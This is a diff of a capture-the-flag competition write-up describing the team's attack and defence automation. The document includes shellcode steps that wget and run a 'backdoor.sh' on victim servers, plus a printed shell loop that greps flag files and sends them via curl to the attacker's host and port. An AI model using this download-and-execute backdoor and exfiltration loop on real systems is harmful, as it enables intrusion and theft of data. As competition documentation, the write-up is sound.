@@ -25,6 +25,7 @@
 \usepackage{sectsty}
 \usepackage{url, lipsum}
 \usepackage{hyperref}
+\usepackage{listings}
 
 \hypersetup{
 	colorlinks,
@@ -110,26 +111,45 @@ Therefore our approach in regards to the list above involves a focus on exploiti
 %-------------------------------------------------------------------------------
 \addcontentsline{toc}{section}{Design}
 \section*{Design and Implementation}
-Our design considers the following assumptions we made about the game server:
+Our design makes the following assumptions about the structure of the competition servers:
 
 \begin{enumerate}
-	\item There will be at \textbf{least} one buffer overflow that allows us to inject the shell code that is equivalent in accomplishing the following two functions:
+	\item There will be at \textbf{least} one buffer overflow or OS code injection vulnerability that allows us to inject the shell code comprising the following commands:
 	\begin{itemize}
 		\item \texttt{wget <serverURI>} - This allows us to install the malicious backdoor on the victim machine
 		\item \texttt{./backdoor.sh} - This allows us to immediately begin running the script after installation
 	\end{itemize}
-	\item We assume flags are being stored, read, and write in the directory: \\\\ \texttt{/opt/ctf/<some\_game\_service>/rw/} \\\\
-	This assumption is made with the statement that all game servers will be similar with each other, including our own. 
+	\item Flags will be stored, read, and written to the following directory: \\\\ \texttt{/opt/ctf/<some\_game\_service>/rw/} \\\\
+	Note that we also assume that all game servers will operate similarly to each other.
 	\item The existing services on the example server will also be present on the live server.\\ 
 	The current services on the example server can be automated through a tool we construct. Furthermore, if the new services added on the live CTF server are similar to the existing services, in terms of vulnerability and input, our tools should be easily configurable to also exploit the new services.
 \end{enumerate}
 
-\noindent We first define our offensive approach. Using the iCTF library provided, we built on top of the existing functions to create custom scripts that automated many tasks that gave us an advantage such as auto exploiting services and auto submitting flags. One major goal of our attack strategy was to develop a method to steal flags directly from the victim file system. This can be achieved by successfully exploiting a buffer overflow attack that will trigger a chain of events, beginning with the injection of a piece of shellcode. This shellcode will contain instructions to install a malicious backdoor program (binary format) on their machine and will also run the installed binary. The result would ideally be the stealing of flags directly from the file system and sending it back to our server which would also double as an automatic service to submit the flags received. This component of our strategy which we dub "the backdoor flag monitor" consists of two separate parts, the server and the flag monitoring program, that coordinate with each other achieve the goal of "direct" flag stealing. \\
+\noindent We first define our offensive approach. Using the iCTF library provided, we built on top of the existing functions to create custom scripts that automated many tasks that gave us an advantage such as auto exploiting services and auto submitting flags. One major goal of our attack strategy was to develop a method to steal flags directly from the victim file system. This can be achieved using either a buffer overflow or OS code injection attack that will trigger a chain of events, beginning with the injection of a piece of shellcode. This shellcode will contain instructions to install a malicious backdoor program (binary format) on their machine and will also run the installed binary. The result would ideally be the stealing of flags directly from the file system and sending it back to our server which would also double as an automatic service to submit the flags received. This component of our strategy which we dub "the backdoor flag monitor" consists of two separate parts, the server and the flag monitoring program, that coordinate with each other achieve the goal of "direct" flag stealing. \\
 
-\noindent The server has three primary functions. It will first and foremost serve the shellcode request for our \texttt{backdoor.sh} script and trigger an install of the program on the victim machine. The second function it has is to listen on a port to be decided and parse HTTP GET URI of the form:\\\\
-$<host>:<port>/flag_{1}/flag_{2}/.../flag_{n}$\\\\ where $0 < flag_i \leq n$ depending on how many files are written to by the master server at every three minute interval. Thirdly, after parsing the URI in the GET request, the server submits the list of flags received to the master server. An important thing to note is that these flags submitted may or may not be correct. This is due to an unknown nature of why multiple files in the directory in which the flags are updated are written to or modified. Because of this behavior, we cannot completely rely on the value of the "most updated file" and rather decide to approach the problem by submitting a set of probable flags. The implementation of this approach is defined in our flag monitoring program, which we will dub \texttt{"backdoor.sh"}.\\
+\noindent The server code, named \texttt{"server.py"}, at a high level works as a basic REST API, and provides three functions. First, it serves the shellcode request for the \texttt{backdoor.sh} script, which in turn triggers the execution of the script on the victim machine. Second, it listens on a specific port and parses HTTP GET requests of the form
 
-\noindent The malicious \texttt{backdoor.sh} works only if assumptions \textbf{(1)} or \textbf{(2)} apply. The program, placed on the victim server, was designed with the knowledge that we've acquired exploring our own server and operates by periodically (every 3 minutes) executing the command \texttt{find /opt/ctf/ -name rw -type d 2>/dev/null}, which will return a list of the most recently updated files in existing \texttt{/rw/} directories that are within \texttt{/opt/ctf/}. The reason why we read a set of files as opposed to simply storing the most recently touched file was due to some unexplained behaviors by the Gamebot/Scriptbot. What had occurred previously was that for an unknown reason, multiple files of a single service would be updated, and because of this behavior, there was no known solution that we had that could pinpoint the correct file to use. Instead we opted to go towards a brute force method described previously. After obtaining the set of the most recently updated files within the past three minutes, the next step consists of the construction of a HTTP GET request which will contain the URI with all the flags appended, with each flag separated by '/'. The packet is then sent through the use of \texttt{curl} and handled by the server.\\
+\begin{lstlisting}
+    <host>:<port>/flag_{1}/flag_{2}/.../flag_{n}
+\end{lstlisting}
+
+\noindent
+where $n$ is the number of flags written to by the master server during every three minute interval. Third, after parsing the flags contained in the URI of the GET request, the server compiles them into an array and submits them to the master server. Importantly, note that not all flags received may be valid. For some unknown, reason, we discovered that the game server periodically writes invalid flags to the server (perhaps to test that it is up). Thus, for each correct flag, there may be several incorrect flags. Initial attempts at scraping flags from the file system failed because we only grabbed the most recent flag. In the final implementation, all flags written in the last 3 minutes are submitted, ensuring that the correct flag is submitted. And since there is no penalty for submitting invalid flags, this approach is satisfactory. The code for the flag monitoring program can be found in \texttt{"backdoor.sh"}.\\
+
+\noindent As mentioned, the malicious \texttt{backdoor.sh} works only if assumptions \textbf{(1)} or \textbf{(2)} apply. The program, placed on the victim server, was designed with the knowledge that we've acquired exploring our own server and operates by periodically (every 3 minutes) executing the code 
+
+\begin{lstlisting}
+for SVC in $(find /opt/ctf/ -name rw -type d);
+do
+    FLAGS=$(find $SVC -type f -cmin -3 -exec grep -o `FLG[[:alnum:]]{13}
+    	   {} \; | paste -sd `/')
+    curl  "$HOST:$PORT/$FLAGS"
+    sleep 3m
+done
+\end{lstlisting}
+
+\noindent
+which constructs a list of flags from the most recently created files found within existing \texttt{/opt/ctf/*/rw} directories. The reason why we read a set of files as opposed to simply storing the most recently touched file was due to some unexplained behaviors by the game server. What had occurred previously was that for an unknown reason, multiple files of a single service would be updated, and because of this behavior, there was no known solution that we had that could pinpoint the correct file to use. Instead we opted to go towards a brute force method described previously. After obtaining the set of the most recently updated files within the past three minutes, the script uses curl to make an HTTP GET request with all the flags in the URI path, each separated by '/'. Once sent, the packet is ideally processed by the server script.
 
 %Still need to add defensive part
 \noindent Our initial approach to defensive automation was focused from the network standpoint. We had originally planned to design a tool that would lie between the services and the network, similar to a firewall. We had planned to use this tool to intercept inputs and payloads before forwarding them into the application, monitor traffic and report those that were suspicious. However after several discussions and more research on the game server, it was decided this was infeasible for several reasons. First and foremost had to do with the way the network was set up, namely, NAT was enabled. This made it extremely difficult to differentiate the source and destination of requests and responses. Another obstacle we encountered were potential race conditions that we would need to win every single time. While true that we could theoretically sniff the network, sanitizing inputs would be difficult in this manner as we must not only run a program to sanitize the input, we also have to construct the "cleaned" payload and then forward that to the service before the original payload reaches it. Examples of such difficulties made us switch directions regarding defense, in particular focus on patching the services themselves. \\
